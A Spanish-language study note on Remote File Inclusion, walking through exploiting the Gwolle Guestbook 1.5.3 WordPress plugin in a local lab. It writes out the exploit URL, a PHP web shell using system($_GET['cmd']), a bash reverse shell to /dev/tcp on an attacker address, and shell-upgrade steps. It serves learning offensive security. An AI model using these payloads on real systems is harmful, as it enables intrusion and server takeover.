------
- Tags: #vulnerabilidades #rce #lfi #web 
-------
# Definición

> La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema

En un ataque de **RFI**, el atacante **utiliza una entrada del usuario**, como una **URL** o un **campo de formulario**, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede **dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad**, lo que le brinda un mayor grado de control en el ataque.

-----
# Creación de un entorno vulnerable

Para este entorno utilizaremos un **Wordpress** que empleamos anteriormente de Github https://github.com/vavkamil/dvwp, luego instalaremos un plugin llamado **Gwolle** con la versión que nos brinda el comando ``searchsploit gwolle``.
Iremos a la web principal de Wordpress y buscaremos por el plugin, luego haremos **Overing** sobre el botón de Download y modificaremos el *URL* al que nos envía por la versión que queremos instalar, en nuestro caso la "*1.5.3*". 
Después iremos a la web donde está el contenedor con Wordpress activo, tras registrarnos iremos a la sección de plugins y añadiremos el archivo descargado del plugin Gwolle y a *Activate Plugin* (Probablemente nos pida permisos por lo tanto nos metemos en una bash dentro del contenedor y hacemos un ``chown -R www-data:www:data`` a todo el directorio */var/www/html/wp-content*).

De forma manual una vez que tengamos todo el entorno listo, utilizaremos **WFUZZ** con **un diccionario de Plugins para Wordpress** ubicado en */usr/share/SecLists* buscando con ``find \-name \*plugins\*`` dentro del directorio. 
El diccionario que utilizaremos está en la ruta */usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt*.

- ``wfuzz -c -t 200 --hc=404 -w '/usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt' -u http://localhost:31337/FUZZ -v``

Allí veremos que nos da como respuesta que **el servidor web tiene el plugin Gwolle** (que fue el que instalamos recién), ahora lo que debemos hacer es **ver el código** que nos da ``searchsploit gwolle``

![[RFI 1.png]]

![[RFI 2.png]]

Cabe destacar que en el mismo Exploit se indica que el *allow_url_include* debe estar colocado en *1*, por lo tanto en *ON* para que este funcione correctamente. A modo de ejemplo lo colocaremos en ON nosotros metiéndonos en el contenedor dentro del archivo *php.ini*. ==Hacer un ``apt update`` y después un ``apt install nano`` para poder abrir el archivo y agregarle la línea ``allow_url_include = "on"`` luego ``docker restart`` del contendor==

Ahora en base a la descripción del **Exploit** que vimos recién, copiaremos la URL brindada por el creador y **colocaremos nuestros datos donde corresponda** al final apuntando a un archivo llamado "**wp-load.php**" de nuestra propiedad, que en este caso tendrá un código malicioso. Esto lo enviaremos por la URL hacia un servidor nuestro ``python3 -m http.server 80``.

URL = http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.0.193/ (Este link automáticamente busca el archivo *wp-load.php* y lo ejecuta)

Nuestro archivo malicioso **wp-load.php** contendrá lo siguiente.

```php 
<?php
  system("whoami");
?>
```

Al enviar la solicitud **la web nos devolverá el nombre del usuario actual** ya que el ``whoami`` se ejecutó correctamente.

- Podríamos colocar ``system($_GET['cmd'])`` en el archivo, y luego en la web agregamos al final un ``&cmd=(comando-que-querramos)`` para ejecutarlo.
- También podríamos entablar un **Reverse Shell** colocando ``&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.193/1234 0>%261"`` recordemos de **URLENCODEAR** los ``"&"`` a ``"%26"``


**Tratamiento de la shell para poder ver todo mas cómodo.**

- ``script /dev/null -c bash``
- ``CTRL + Z``
- ``stty raw -echo; fg``
- ``reset xterm``
- ``stty size`` (En nuestra máquina y colocar el siguiente comando con las medidas que nos dio este)
- ``stty rows 41 columns 184``
- ``export TERM=xterm`` (Para el clear de consola)

